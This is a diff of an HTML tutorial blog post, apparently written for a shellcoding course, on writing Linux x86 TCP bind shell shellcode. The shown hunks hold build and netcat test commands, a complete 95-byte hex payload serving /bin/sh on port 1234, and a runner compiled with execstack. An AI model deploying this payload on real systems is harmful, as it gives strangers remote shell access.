@@ -66,10 +66,10 @@
 
         <article>
             <p>If you haven't written a bind TCP shell in Assembly before, then it is better to start with a higher-level language working prototype and then translate it to Assembly. The obvious choice of the higher level language for Linux is C. Here is a working TCP bind shell code in C. I tried to remove as much unneeded code as possible. Generally it may be a bad idea, but when writing shellcode, this is exactly what you want - a working thing with as few parts as possible.</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;strings.h&gt;</span>
-<span class="cp">#include &lt;sys/socket.h&gt;</span>
-<span class="cp">#include &lt;netinet/in.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;strings.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
 
 <span class="cp">#define PORT 1234</span>
 
@@ -105,13 +105,13 @@
 
 
 <p>After we compile and start it, we should make sure that the program is working:</p>
-<div class="highlight"><pre><span class="c"># Build and start the program</span>
+<div class="highlight"><pre><span></span><span class="c1"># Build and start the program</span>
 gcc bindshell.c -o bindshell <span class="o">&amp;&amp;</span> ./bindshell
 
-<span class="c"># Connect from another console and execute some commands making sure you got the shell</span>
-nc localhost 1234
+<span class="c1"># Connect from another console and execute some commands making sure you got the shell</span>
+nc localhost <span class="m">1234</span>
 id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
 ^C
 </pre></div>
 
@@ -119,7 +119,7 @@ id
 <p>Now, to get a compact shellcode we first need to translate the above C code into Assembly.</p>
 <p>One nitty gritty detail you must be aware of is that four socket-related functions that were used in the C program actually use the same kernel entry point - <code>socketcall</code>. The manual page for this syscall (<code>man 2 socketcall</code>) says that only standard library implementers and kernel hackers need to know about it. It also says that this implementation is x86 platform specific and that on x86-64 and ARM there is no <code>socketcall</code> system call; instead <code>socket</code>, <code>accept</code>, <code>bind</code>, and all other socket functions are implemented as separate system calls.</p>
 <p>Here is the Assembly version of the TCP bind shell with my extensive comments:</p>
-<div class="highlight"><pre><span class="k">section</span> <span class="nv">.text</span>
+<div class="highlight"><pre><span></span><span class="k">section</span> <span class="nv">.text</span>
     <span class="k">global</span> <span class="nv">_start</span>
 
 <span class="nl">_start:</span>
@@ -204,13 +204,13 @@ id
 
 
 <p>After building a binary from the above source code we extract the shellcode and test it in the C program:</p>
-<div class="highlight"><pre>nasm -f elf bindshell.asm <span class="o">&amp;&amp;</span> ld -o bindshell bindshell.o
+<div class="highlight"><pre><span></span>nasm -f elf bindshell.asm <span class="o">&amp;&amp;</span> ld -o bindshell bindshell.o
 scdump bindshell
 </pre></div>
 
 
 <p>Output (formatted to fit on the screen):</p>
-<div class="highlight"><pre>Length:  95
+<div class="highlight"><pre><span></span>Length:  95
 Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80&quot;
 &quot;\x97\x31\xc0\xb0\x66\x5b\x5e\x52\x66\x68\x04\xd2\x66\x53\x6a\x10\x51\x57\x89&quot;
 &quot;\xe1\xcd\x80\x31\xff\x5a\x57\x52\xb3\x04\x89\xe1\xb0\x66\xcd\x80\x57\x57\x52&quot;
@@ -221,8 +221,8 @@ Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\
 
 
 <p>That's it. We have a working shellcode that initiates listening on predetermined port and serves a <code>/bin/sh</code> shell to anyone connecting to that port. To make sure the shellcode works as intended, let's run it from inside of our C shellcode-framing program:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 
 <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> 
 <span class="s">&quot;</span><span class="se">\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x31</span><span class="s">&quot;</span>
@@ -242,16 +242,16 @@ Payload: &quot;\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\
 
 
 <p>After the build and successful test we can perform the winner dance =).</p>
-<div class="highlight"><pre><span class="c"># In one console window</span>
+<div class="highlight"><pre><span></span><span class="c1"># In one console window</span>
 gcc -fno-stack-protector -z execstack -o scframe scframe.c
 ./scframe
 
-<span class="c"># In the second console window</span>
-nc localhost 1234
+<span class="c1"># In the second console window</span>
+nc localhost <span class="m">1234</span>
 </pre></div>
 
 
-<p><img alt="Bind TCP shell shellcode successful test" src="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/tcp-bind-shellcode-successful-test.png" title="Bind TCP shell shellcode successful test" />
+<p><img alt="Bind TCP shell shellcode successful test" src="http://www.wryway.com/blog/building-tcp-bind-shell-shellcode/tcp-bind-shellcode-successful-test.png" title="Bind TCP shell shellcode successful test">
 <div class="img-caption">Bind TCP shell shellcode successful test</div></p>
 <div class="divider"></div>
 
@@ -308,7 +308,7 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015-2016.
+    Oleg Mitrofanov &copy; 2015-2017.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
